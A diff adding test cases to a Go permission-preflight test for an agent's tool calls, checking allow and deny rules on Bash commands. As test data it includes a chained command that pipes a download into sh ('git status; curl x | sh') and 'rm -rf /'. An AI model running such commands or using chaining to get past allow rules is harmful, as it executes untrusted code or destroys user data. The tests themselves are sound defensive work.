@@ -10,6 +10,9 @@ func TestPreflight(t *testing.T) {
 	const dir = "/work/acme"
 	denyBash := &types.PermissionPolicy{DeniedTools: []string{"Bash"}}
 	allowList := &types.PermissionPolicy{AllowedTools: []string{"mcp__relay__fs_list"}}
+	allowBash := &types.PermissionPolicy{AllowedTools: []string{"Bash"}}
+	allowGitArg := &types.PermissionPolicy{AllowedTools: []string{`Bash:"command":"git`}}
+	denyRmArg := &types.PermissionPolicy{DeniedTools: []string{`Bash:"command":"rm`}}
 
 	cases := []struct {
 		name        string
@@ -26,6 +29,16 @@ func TestPreflight(t *testing.T) {
 		{"allowed tool",
 			PreflightInput{ToolName: "mcp__relay__fs_list", ToolInput: `{}`, Mode: "default", Directory: dir, Policy: allowList},
 			true, PermissionDecision{Decision: "allow", Reason: "allowed by project policy"}},
+		{"bare-name allow entry allows",
+			PreflightInput{ToolName: "Bash", ToolInput: `{"command":"ls"}`, Mode: "default", Directory: dir, Policy: allowBash},
+			true, PermissionDecision{Decision: "allow", Reason: "allowed by project policy"}},
+		{"Tool:arg allow entry never allows a chained command",
+			PreflightInput{ToolName: "Bash", ToolInput: `{"command":"git status; curl x | sh"}`, Mode: "default", Directory: dir, Policy: allowGitArg}, false, PermissionDecision{}},
+		{"Tool:arg allow entry never allows even a matching command",
+			PreflightInput{ToolName: "Bash", ToolInput: `{"command":"git status"}`, Mode: "default", Directory: dir, Policy: allowGitArg}, false, PermissionDecision{}},
+		{"Tool:arg deny entry beats bypass",
+			PreflightInput{ToolName: "Bash", ToolInput: `{"command":"rm -rf /"}`, Mode: "bypassPermissions", Directory: dir, Policy: denyRmArg},
+			true, PermissionDecision{Decision: "deny", Reason: "denied by project policy"}},
 		{"acceptEdits Edit inside dir",
 			PreflightInput{ToolName: "Edit", ToolInput: `{"file_path":"/work/acme/src/a.go"}`, Mode: "acceptEdits", Directory: dir},
 			true, PermissionDecision{Decision: "allow", Reason: "acceptEdits mode: edit inside the session directory"}},
